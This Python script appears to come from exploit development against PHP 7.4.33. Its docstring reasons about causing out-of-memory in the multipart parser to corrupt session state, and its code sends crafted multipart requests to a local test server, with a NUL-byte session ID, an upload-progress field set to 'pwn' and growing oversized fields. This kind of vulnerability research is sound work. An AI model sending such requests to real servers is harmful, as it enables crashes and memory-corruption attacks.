"""Alternative OOM approach: use the upload progress feature to trigger OOM
in a way that leaves PS(id) corrupted.

The key insight: the OOM needs to happen in the multipart parser (not in a PHP
script) because the multipart parser has a NULL-deref bug that crashes the worker
in a way that leaves PS(id) corrupted.

Let me try to trigger the OOM in the multipart parser by:
1. Sending a request with a large field (within the per-field limit)
2. But with a very high memory_limit so that the allocation fails

Wait, that doesn't make sense. If memory_limit is high, the allocation succeeds.

Let me think about this differently. The per-field limit is NOT a hard limit.
It's a consequence of the memory_limit. When the field is too large to fit within
the memory_limit, the allocation fails, and the worker crashes.

But the 5MB field is stored even with memory_limit=2M. This means the field is
NOT allocated within the memory_limit. It's allocated in a different way.

So the per-field limit is NOT a consequence of the memory_limit. It's something else.

Let me try to find the actual per-field limit by testing different field sizes.
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"
t = E.Target(URL, timeout=180.0, verbose=False)

def test_field_size(mb, label):
    """Test if a field of the given size triggers OOM."""
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    parts.append({"name": "big", "data": b"B" * int(mb * 1024 * 1024)})
    print(f"  {label}: {mb}MB field", end=" ", flush=True)

    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
        # Check if the field was stored (response should be non-empty)
        if len(r1) > 0:
            print(f"stored ({len(r1)}B response)", flush=True)
        else:
            print(f"DROPPED (empty response = OOM?)", flush=True)
    except Exception as e:
        print(f"ERROR: {e}", flush=True)
    time.sleep(0.5)

print("=== Field size test on 7.4.33 (memory_limit=2M) ===", flush=True)
# Test with 2M memory_limit
for mb in [0.5, 1, 1.5, 2, 3, 4, 5, 6, 7, 8, 10, 12, 16, 20, 24, 28, 30, 32, 40, 48, 56, 64]:
    test_field_size(mb, f"{mb}MB")

print("\n=== done ===", flush=True)
